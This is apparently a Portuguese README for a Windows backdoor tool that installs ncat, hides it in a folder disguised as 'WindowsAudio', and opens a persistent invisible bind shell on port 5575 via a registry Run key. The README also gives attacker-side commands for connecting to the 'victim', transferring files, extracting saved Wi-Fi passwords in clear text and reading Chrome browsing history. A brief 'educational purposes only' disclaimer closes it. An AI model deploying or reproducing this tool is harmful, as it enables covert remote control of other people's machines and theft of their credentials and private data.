# ncat_shell_win

Bind Shell persistente no Windows via NCAT (Nmap).

## 📋 Requisitos

- Windows 10/11
- Conexão com internet (para instalar o Nmap via winget)

## 🚀 O que o install.bat faz

| Descrição |
|-----------|
| 1 | Instala o **Nmap** silenciosamente via `winget` (contém o `ncat`) |
| 2 | Cria pasta oculta `C:\Users\Usuario\WindowsAudio\` (atributo +h) |
| 3 | Cria `audio.vbs` - Loop infinito com ncat invisível na porta **5575** |
| 4 | Cria `audio.bat` - Executa o .vbs e fecha |
| 5 | Adiciona ao Registro - Inicia junto com Windows (`WindowsAudio`) |
| 6 | Sobe o listener imediatamente |

## Como usar

### 1. Na vítima (Windows)
Execute o arquivo `install.bat` (duplo clique).

### 2. No atacante
```bash
# Windows (via ncat)
ncat IP_DA_VITIMA 5575

# Linux (via nc ou ncat)
nc IP_DA_VITIMA 5575
ncat IP_DA_VITIMA 5575

🔍 Verificar persistência
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio"

🗑️ Remoção completa
taskkill /f /im ncat.exe
taskkill /f /im wscript.exe
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /f
rmdir /s /q "%USERPROFILE%\WindowsAudio"

📡 Transferir arquivos
Enviar arquivo do Linux para o Windows
No shell Windows conectado:

ncat -lnp 5581 > "C:\Users\Usuario\Desktop\arquivo.jpg"
No Linux (outro terminal):

ncat IP_DA_VITIMA 5581 < /caminho/do/arquivo.jpg
🔑 Comandos úteis pós-conexão
shutdown /r /t 0                               # Reiniciar
whoami                                         # Ver usuário atual
whoami /groups                                 # Ver grupos/privilégios
tasklist                                       # Listar processos
netstat -ano                                   # Conexões de rede
netsh wlan show profiles                       # Redes Wi-Fi salvas
netsh wlan show profile name="REDE" key=clear  # Senha do Wi-Fi
findstr /i "http" "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History"  # Histórico Chrome

⚠️ Aviso
Este projeto é apenas para fins educacionais e testes autorizados. O uso indevido é de total responsabilidade do usuário.
